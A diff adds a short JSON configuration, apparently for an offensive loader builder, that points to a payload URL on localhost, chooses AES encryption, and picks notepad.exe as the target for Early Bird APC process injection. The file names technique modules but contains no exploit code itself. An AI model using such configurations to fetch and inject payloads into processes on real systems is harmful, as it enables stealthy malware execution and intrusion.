@@ -1,0 +1,8 @@
+{
+    "Url": "http://localhost:8000/payload.bin",
+    "Encryption": "AESEnc.h",
+    "Enumeration": "CreationSpells/CreateDebugged.h",
+    "ProcessName": "notepad.exe",
+    "Loader": "RemoteExecutionSpells/EarlyBirdApcInjection.h",
+    "Decoy": "null"
+}
